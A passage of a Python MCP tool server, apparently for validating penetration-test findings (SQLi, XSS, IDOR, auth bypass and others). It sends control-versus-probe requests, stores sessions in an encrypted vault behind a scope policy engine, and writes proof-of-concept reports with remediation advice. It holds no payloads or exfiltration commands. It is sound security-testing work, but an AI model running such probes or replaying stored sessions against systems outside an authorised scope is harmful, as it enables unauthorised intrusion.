    "token roundtrip": validate_token_roundtrip,
    "token_roundtrip": validate_token_roundtrip,
    "encryption oracle": validate_token_roundtrip,
    "decrypt oracle": validate_token_roundtrip,
    "appflow oracle": validate_token_roundtrip,
    "validate_appflow_oracle": validate_token_roundtrip,
}


def _introspect_validators() -> tuple[dict, dict[str, list[str]]]:
    """Dinamik validator kesfi: moduldeki tum validate_* fonksiyonlarini ve imzalarini cikar."""
    table = dict(_DISPATCH)
    signatures: dict[str, list[str]] = {}
    for name, obj in list(globals().items()):
        if not callable(obj) or not name.startswith("validate_") or name == "validate_finding":
            continue
        short = name[len("validate_"):]
        table.setdefault(name, obj)
        table.setdefault(short, obj)
        table.setdefault(short.replace("_", " "), obj)
        try:
            signatures[name] = list(inspect.signature(obj).parameters.keys())
        except (TypeError, ValueError):
            signatures[name] = []
    return table, signatures


def _infer_validator_from_params(kwargs: dict):
    """Sinif adindan bagimsiz yonlendirme: params_json yapisindan uygun validator'i sec."""
    if not isinstance(kwargs, dict) or not kwargs:
        return None
    keys = set(kwargs.keys())
    if {"encrypt_url", "decrypt_url"} <= keys:
        return validate_token_roundtrip
    if {"write_url", "read_url"} <= keys:
        return validate_second_order
    if {"owner_headers_json", "attacker_headers_json"} <= keys:
        return validate_idor
    if "authorized_headers_json" in keys:
        return validate_auth_bypass
    if {"baseline_json", "observations_json"} <= keys:
        return analyze_differential_observations
    if "sample_value" in keys and ("carrier" in keys or "name" in keys or len(keys) == 1):
        return validate_token_differential
    return None


def _validate_behavioral_invariant(vuln_type: str, target_url: str, kwargs: dict) -> str:
    """Taksonomi-disi siniflar icin genel davranissal degismez (control vs probe) dogrulayici."""
    probe_url = str(kwargs.get("probe_url") or target_url or "").strip()
    control_url = str(kwargs.get("control_url") or target_url or probe_url).strip()
    if not probe_url:
        return json.dumps({"verdict": ERROR, "error": "target_url veya probe_url gerekli"}, ensure_ascii=False)
    method = str(kwargs.get("method") or "GET").upper()
    control_method = str(kwargs.get("control_method") or method).upper()
    headers = _headers(str(kwargs.get("headers_json") or "{}"))
    probe_headers = {**headers, **_headers(str(kwargs.get("probe_headers_json") or "{}"))}
    control_data = kwargs.get("control_data")
    probe_data = kwargs.get("probe_data") if "probe_data" in kwargs else kwargs.get("data")
    expected_marker = str(kwargs.get("expected_marker") or "")
    forbidden_marker = str(kwargs.get("forbidden_marker") or "")
    expected_status = kwargs.get("expected_status")

    ctrl = _request(control_method, control_url, data=control_data, headers=headers)
    prb = _request(method, probe_url, data=probe_data, headers=probe_headers)
    if not ctrl.get("ok") or not prb.get("ok"):
        return _result(
            vuln_type or "Behavioral Invariant",
            probe_url,
            ERROR,
            "behavioral_invariant",
            {"control_error": ctrl.get("error"), "probe_error": prb.get("error")},
            "-",
        )
    ctrl_text = ctrl.get("text") or ""
    prb_text = prb.get("text") or ""
    ctrl_status = ctrl.get("status")
    prb_status = prb.get("status")

    checks_run = 0
    checks_passed = 0
    reasons = []
    if expected_status is not None:
        checks_run += 1
        if int(prb_status or 0) == int(expected_status) and int(ctrl_status or 0) != int(expected_status):
            checks_passed += 1
            reasons.append(f"status_transition:{ctrl_status}->{prb_status}")
    if expected_marker:
        checks_run += 1
        if expected_marker in prb_text and expected_marker not in ctrl_text:
            checks_passed += 1
            reasons.append(f"expected_marker_appeared:{expected_marker[:40]}")
    if forbidden_marker:
        checks_run += 1
        if forbidden_marker in ctrl_text and forbidden_marker not in prb_text:
            checks_passed += 1
            reasons.append(f"forbidden_marker_vanished:{forbidden_marker[:40]}")

    evidence = {
        "control_url": control_url,
        "probe_url": probe_url,
        "control_status": ctrl_status,
        "probe_status": prb_status,
        "control_len": ctrl.get("len"),
        "probe_len": prb.get("len"),
        "matched_invariants": reasons,
    }
    if checks_run > 0 and checks_passed == checks_run:
        return _result(
            vuln_type or "Behavioral Invariant Violation",
            probe_url,
            CONFIRMED,
            "behavioral_invariant",
            evidence,
            _curl(method, probe_url, body=str(probe_data or ""), headers=probe_headers),
            notes="Kontrol istegi ile probe istegi arasinda tanimlanan davranissal degismez kanitlandi.",
        )
    return _result(
        vuln_type or "Behavioral Invariant Violation",
        probe_url,
        UNCONFIRMED,
        "behavioral_invariant",
        evidence,
        "-",
        notes="Davranissal degismez kosullari kontrol ve probe arasinda ayrisamadi.",
    )


@mcp.tool()
def analyze_differential_observations(baseline_json: str, observations_json: str) -> str:
    """Baseline ile probe gözlemleri arasındaki davranış sapmalarını kümeler.

    Yalnızca durum, süre, uzunluk, header/cookie adları ve gövde şeması
    kullanılır; gövde ve header/cookie değerleri çıktıya kopyalanmaz. Sonuç
    anomali kanıtıdır, tek başına zafiyet hükmü değildir.

    Args:
        baseline_json: Kararlı baseline örneklerinin JSON listesi
        observations_json: Karşılaştırılacak probe örneklerinin JSON listesi
    """
    try:
        baseline = json.loads(baseline_json) if baseline_json else []
        observations = json.loads(observations_json) if observations_json else []
    except Exception as e:
        return json.dumps({"error": f"JSON parse hatası: {e}"}, ensure_ascii=False)
    if not isinstance(baseline, list) or not isinstance(observations, list):
        return json.dumps({"error": "baseline_json ve observations_json JSON listesi olmalı"}, ensure_ascii=False)
    return json.dumps(
        _analyze_differential_observations(baseline, observations),
        indent=2,
        ensure_ascii=False,
    )


@mcp.tool()
def validate_finding(vuln_type: str, target_url: str = "", params_json: str = "{}") -> str:
    """Genel doğrulama yönlendiricisi — vuln_type veya params_json yapısına göre doğru
    deterministik validator'ı seçer. Taksonomi dışı sınıflar için davranışsal değişmez
    (control vs probe) doğrulayıcısına geri düşer.

    Args:
        vuln_type: Zafiyet tipi ('sqli','ssti','xss','lfi','command injection','open redirect','idor','auth bypass','xxe','ssrf','padding oracle','csrf','second_order' veya özel sınıf; '?' / 'list' tüm validator imzalarını listeler)
        target_url: Hedef URL (çoğu validator için)
        params_json: Validator'a iletilecek ek argümanlar (JSON), örn:
            {"param":"id","method":"GET","headers_json":"{}"} veya
            IDOR için {"object_url":"...","owner_headers_json":"...","attacker_headers_json":"..."} veya
            sınıfsız davranışsal kanıt için {"control_url":"...","probe_url":"...","expected_marker":"..."}
    """
    try:
        kwargs = json.loads(params_json) if params_json else {}
        if not isinstance(kwargs, dict):
            kwargs = {}
    except Exception:
        kwargs = {}

    dispatch_table, signatures = _introspect_validators()
    key = (vuln_type or "").strip().lower()
    if key in ("?", "list", "capabilities", "introspect"):
        return json.dumps({
            "verdict": "INFO",
            "supported": sorted(set(dispatch_table.keys())),
            "validator_signatures": signatures,
        }, indent=2, ensure_ascii=False)

    fn = dispatch_table.get(key) or dispatch_table.get(key.replace("-", "_")) or dispatch_table.get(key.replace("_", " "))
    if not fn:
        for k, v in dispatch_table.items():
            if k in key:
                fn = v
                break
    if not fn:
        fn = _infer_validator_from_params(kwargs)
    if not fn:
        if any(k in kwargs for k in ("expected_marker", "forbidden_marker", "expected_status", "control_url", "probe_url", "probe_data")):
            return _validate_behavioral_invariant(vuln_type, target_url, kwargs)
        return json.dumps({
            "verdict": ERROR,
            "error": f"Desteklenmeyen vuln_type: '{vuln_type}'",
            "supported": sorted(set(dispatch_table.keys())),
            "validator_signatures": signatures,
            "behavioral_fallback_hint": (
                "Taksonomi dışı sınıflar için params_json içine {'control_url','probe_url','expected_marker'|'forbidden_marker'|'expected_status'} "
                "veya {'write_url','read_url'} / {'encrypt_url','decrypt_url'} / {'owner_headers_json','attacker_headers_json'} verin."
            ),
        }, indent=2, ensure_ascii=False)
    try:
        _accepts_target = "target_url" in inspect.signature(fn).parameters
    except (TypeError, ValueError):
        _accepts_target = False
    if target_url and "target_url" not in kwargs and _accepts_target and fn not in (validate_auth_bypass, validate_idor):
        kwargs["target_url"] = target_url
    if fn is validate_auth_bypass and target_url and "protected_url" not in kwargs:
        kwargs["protected_url"] = target_url
    if fn is validate_idor and target_url and "object_url" not in kwargs:
        kwargs["object_url"] = target_url
    if fn is validate_file_upload and target_url and "upload_url" not in kwargs:
        kwargs["upload_url"] = target_url
    try:
        return fn(**kwargs)
    except TypeError as e:
        return json.dumps({"verdict": ERROR, "validator": fn.__name__,
                           "expected_parameters": signatures.get(fn.__name__, []),
                           "error": f"Eksik/yanlış argüman: {e}"},
                          indent=2, ensure_ascii=False)


@mcp.tool()
def generate_validation_report(result_json: str, target: str = "",
                               remediation: str = "") -> str:
    """Bir doğrulama sonucundan (herhangi bir validator çıktısı) XBOW-tarzı,
    yeniden üretilebilir bir Markdown kanıt raporu üretir (PoC + reproduction).

    Args:
        result_json: Bir validator'ın döndürdüğü JSON sonuç
        target: (opsiyonel) hedef adı/scope override
        remediation: (opsiyonel) önerilen düzeltme metni
    """
    try:
        r = json.loads(result_json)
    except Exception as e:
        return f"HATA: result_json parse edilemedi: {e}"

    report_redactions = []
    r = redact_value(r, report_redactions)

    verdict = r.get("verdict", "?")
    v2_artifact_verified = artifact_is_current(
        r,
        expected_target=target or r.get("target", ""),
        expected_finding_type=r.get("vuln_type", ""),
    ) if r.get("schema_version") == SCHEMA_VERSION else False
    provenance = "VERIFIED V2 ARTIFACT" if v2_artifact_verified else "LEGACY / UNVERIFIED INPUT"
    effective_verdict = verdict
    if verdict == CONFIRMED and not v2_artifact_verified:
        effective_verdict = "UNVERIFIED_INPUT"
    icon = {"CONFIRMED": "✅", "UNCONFIRMED": "⬜", "INCONCLUSIVE": "⚠️",
            "ERROR": "❌", "UNVERIFIED_INPUT": "⚠️"}.get(effective_verdict, "•")
    sev = r.get("severity", "info")
    conf = r.get("confidence", 0.0)
    repro = r.get("reproduction", [])
    if isinstance(repro, str):
        repro = [repro]
    ev = r.get("evidence", {})
    default_rem = {
        "SQL Injection": "Parametreli sorgu (prepared statement) kullan; ORM bind; input allowlist.",
        "Server-Side Template Injection": "Kullanıcı girdisini template'e koyma; sandbox'lı engine; autoescape.",
        "OS Command Injection": "Shell çağrısından kaçın; argüman dizisi + allowlist; shell=False.",
        "Path Traversal / LFI": "Yol normalize + canonical kök kontrolü; allowlist; kullanıcı yolunu dosya sistemine verme.",
        "Reflected XSS": "Bağlama duyarlı output encoding; CSP; framework auto-escape.",
        "Open Redirect": "Yönlendirme hedefini allowlist'le; göreli yol zorla.",
        "Authentication/Authorization Bypass": "Sunucu tarafı erişim kontrolü; her istekte yetki doğrula.",
        "Insecure Direct Object Reference (IDOR)": "Nesne sahipliğini sunucuda doğrula; dolaylı referans haritası.",
        "XML External Entity (XXE)": "DTD/external entity'leri kapat; güvenli XML parser config.",
    }
    vt = r.get("vuln_type", "Finding")
    rem = remediation or next((v for k, v in default_rem.items() if k in vt), "Girdi doğrulama ve güvenli kodlama uygula.")

    lines = [
        f"# {icon} Doğrulama Raporu — {vt}",
        "",
        f"- **Hedef:** `{target or r.get('target','-')}`",
        f"- **Verdict:** **{effective_verdict}** ({icon})",
        f"- **Kanıt kaynağı:** {provenance}",
        f"- **Şiddet (severity):** {sev}",
        f"- **Güven (deterministik):** {conf}",
        f"- **Oracle:** `{r.get('oracle','-')}`",
        f"- **Zaman:** {r.get('timestamp','-')}",
        "",
        "## Kanıt (Evidence)",
        "```json",
        json.dumps(ev, indent=2, ensure_ascii=False).replace("```", "` ` `"),
        "```",
        "",
        "## Yeniden Üretim (Reproduction)",
    ]
    if repro and repro != ["-"]:
        lines.append("```bash")
        lines.extend(str(item).replace("```", "` ` `") for item in repro)
        lines.append("```")
    else:
        lines.append("_Yeniden üretim adımı yok (doğrulanmadı)._")
    lines += [
        "",
        "## Notlar",
        str(r.get("notes", "-")).replace("```", "` ` `"),
        "",
        "## False-Positive Koruması",
        r.get("false_positive_guard", "-"),
        f"Redactions: {', '.join(sorted(set(report_redactions))) or 'none'}",
        "",
        "## Düzeltme (Remediation)",
        rem,
        "",
        "---",
        f"_CCO Deterministik Validator — audit: `{r.get('audit_trail','(kaydedilmedi)')}`_",
    ]
    return "\n".join(lines)


def _session_store():
    mem_dir = os.path.abspath(os.path.join(_SERVER_DIR, "..", "mcp-memory-server"))
    if mem_dir not in sys.path:
        sys.path.insert(0, mem_dir)
    from cco_surface_core import session_store
    return session_store


@mcp.tool()
def session_vault_put(target: str, identity: str = "anon", headers_json: str = "{}",
                      cookies_json: str = "{}", check_url: str = "",
                      marker: str = "") -> str:
    """Store a session in the encrypted credential vault with a 0600 index.
    The return value exposes only account metadata and header/cookie names."""
    try:
        headers = json.loads(headers_json or "{}")
        cookies = json.loads(cookies_json or "{}")
    except Exception as e:
        return json.dumps({"verdict": ERROR, "error": f"JSON parse: {e}"}, ensure_ascii=False)
    store = _session_store()
    out = store.put_session(target, identity, headers=headers, cookies=cookies,
                            check_url=check_url, marker=marker)
    return json.dumps({"stored": True, **out}, ensure_ascii=False, indent=2)


@mcp.tool()
def session_vault_bind_resources(target: str, identity: str, resources_json: str) -> str:
    """Bind declared synthetic function/protected resources to an existing session.

    No requests are sent. Edits require a new session_vault_check before use.
    Returns metadata only; markers and resource URLs remain encrypted.
    """
    try:
        scripts = os.path.abspath(os.path.join(_SERVER_DIR, "..", "..", "scripts"))
        if scripts not in sys.path:
            sys.path.insert(0, scripts)
        from policy_engine import ScopeResolver
        out = _session_store().bind_resources(target, identity, json.loads(resources_json),
                                              permits=ScopeResolver().permits_url)
        return json.dumps({"stored": True, **out}, ensure_ascii=False)
    except (ValueError, TypeError, OSError):
        return json.dumps({"stored": False, "error": "declared test resource binding unavailable"})


@mcp.tool()
def session_vault_check(target: str, identity: str = "anon") -> str:
    """Check one same-origin GET and an account marker under current policy.
    Failed, redirected, expired and rate-limited checks never establish freshness."""
    store = _session_store()

    def _get(url, headers, cookies):
        hdrs = dict(headers or {})
        if cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
        # The stored check URL can differ from the tool's target argument.
        # Recheck the actual one-hop request (including required headers), so
        # a stale grant or an out-of-scope path cannot leak the session.
        scripts = os.path.abspath(os.path.join(_SERVER_DIR, "..", "..", "scripts"))
        if scripts not in sys.path:
            sys.path.insert(0, scripts)
        from policy_engine import PolicyEngine
        from cco_validator_core.egress import current_wire_gate, scoped_wire_gate
        preflight = PolicyEngine().validate_tool_invocation("validator_session_vault_check", {
            "target": url, "url": url, "method": "GET", "headers": hdrs},
            _wire_request=True, _policy_preflight=True)
        if not preflight["allowed"]:
            raise PermissionError("session check blocked by policy")
        def session_gate(method, actual_url, actual_headers):
            decision = PolicyEngine().validate_wire_invocation("validator_session_vault_check", {
                "target": actual_url, "url": actual_url, "method": method, "headers": actual_headers})
            return decision["allowed"], decision["reason"]
        # The inherited executor gate already checks the actual stored URL at
        # transport time. Direct calls install the same guard, exactly once.
        with scoped_wire_gate(current_wire_gate() or session_gate):
            resp = _request("GET", url, headers=hdrs, allow_redirects=False)
        if not resp.get("ok"):
            raise ConnectionError("session check transport failed")
        return resp.get("status", 0), resp.get("text", "")

    out = store.refresh_status(target, identity, _get)
    out["verdict"] = CONFIRMED if out.get("status") == "fresh" else INCONCLUSIVE
    return json.dumps(out, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    mcp.run()
